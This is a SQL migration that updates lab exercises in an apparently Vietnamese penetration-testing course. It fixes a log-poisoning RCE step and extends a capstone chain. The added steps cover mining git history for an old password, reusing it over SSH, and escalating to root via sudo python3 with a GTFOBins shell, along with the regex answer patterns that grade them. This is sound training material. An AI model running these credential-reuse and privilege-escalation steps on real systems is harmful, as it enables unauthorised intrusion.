-- 0038_assignment4_and_10_fixes: fix remaining audit findings.
--  Assignment 4 step 4 (index 3): output had a stray leftover line
--  duplicating the earlier /etc/passwd output even though the command
--  being simulated is `cmd=id`, not cat /etc/passwd again -- removed.
--  Assignment 10: title promises "full chain tu recon den root" but the
--  original 5 steps stopped at git-dumper pulling the leaked .git repo.
--  Appended 5 more steps so the chain actually reaches root: find the old
--  password in git history, reuse it over SSH, sudo -l, then GTFOBins
--  python3 privesc to root.

UPDATE cards SET payload = jsonb_set(payload, '{steps,3,output}', '"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n(PHP payload chèn trong User-Agent đã được thực thi khi include() đọc dòng log chứa nó — log poisoning thành công)"'::jsonb, false)
WHERE kind = 'lab' AND front = 'Assignment 4 — LFI + log poisoning đến RCE';

UPDATE cards SET payload = jsonb_set(
  payload,
  '{steps}',
  (payload->'steps') || '[{"output": "commit a3f1c9e Remove hardcoded password\n-        $DB_PASS = ''OldPass_2024!'';\n+        $DB_PASS = getenv(''DB_PASS'');", "prompt": "Vào thư mục ./dump vừa tải, tìm lại mật khẩu cũ còn sót trong lịch sử commit git.", "hint": "cd dump && git log --all -p | grep -i pass", "type": "command", "patterns": ["git\\s+log\\s+--all\\s+-p\\s*\\|\\s*grep\\s+-i\\s+pass"], "explanation": "git log --all -p in ra full diff của MỌI commit (kể cả đã bị xóa khỏi bản mới nhất) — nên dù code hiện tại đã sửa, mật khẩu cũ trong commit \"remove hardcoded password\" vẫn còn nguyên trong lịch sử."}, {"prompt": "Tìm được creds cũ admin/OldPass_2024! trong lịch sử commit. Theo nguyên tắc \"khép kín vòng tấn công\" đã nêu ở bước trước, bạn thử credential này ở đâu trước?", "type": "choice", "choices": ["SSH (cổng 22 phát hiện ngay từ đầu) — thử lại credential ở MỌI bề mặt tấn công khác", "Bỏ qua, creds cũ trong lịch sử git chắc chắn đã bị đổi và không còn dùng được", "Chỉ ghi vào báo cáo, không thử nghiệm gì thêm"], "answer": 0, "explanation": "Password reuse (dùng lại 1 mật khẩu ở nhiều nơi) cực kỳ phổ biến trong thực chiến — credential cũ bị bỏ khỏi code không có nghĩa account đó đã đổi mật khẩu trên hệ thống, luôn đáng thử lại."}, {"output": "admin@capstone:~$", "prompt": "Đăng nhập SSH bằng creds vừa tìm được (user admin).", "hint": "ssh admin@10.10.20.200", "type": "command", "patterns": ["ssh\\s+admin@10\\.10\\.20\\.200"], "explanation": "Password reuse thành công — có shell user thường (admin) qua SSH, bước tiếp theo là tìm đường leo quyền lên root giống Lab 7."}, {"output": "Matching Defaults entries for admin on capstone:\n    env_reset, mail_badpass\nUser admin may run the following commands on capstone:\n    (ALL) NOPASSWD: /usr/bin/python3", "prompt": "Kiểm tra quyền sudo của user admin để tìm đường leo lên root.", "hint": "sudo -l", "type": "command", "patterns": ["sudo\\s+-l\\b"], "explanation": "sudo -l cho thấy admin được chạy /usr/bin/python3 với NOPASSWD — tra ngay GTFOBins mục python3 để tìm cách khai thác leo quyền."}, {"output": "# whoami\nroot", "prompt": "Theo GTFOBins (mục python3, phần Sudo), khai thác quyền sudo trên /usr/bin/python3 để spawn shell root.", "hint": "sudo python3 -c ''import os; os.system(\"/bin/sh\")''", "type": "command", "patterns": ["sudo\\s+python3\\s+-c\\s+.?import\\s+os;\\s*os\\.system\\(.?/bin/sh.?\\)"], "explanation": "python3 chạy với sudo không mật khẩu cho phép spawn shell thừa kế quyền root qua os.system() — whoami trả về root nghĩa là đã hoàn thành trọn vòng: recon -> web -> .git leak -> credential trong lịch sử commit -> SSH -> sudo privesc -> root."}]'::jsonb,
  true
)
WHERE kind = 'lab' AND front = 'Assignment 10 — Capstone: full chain từ recon đến root';
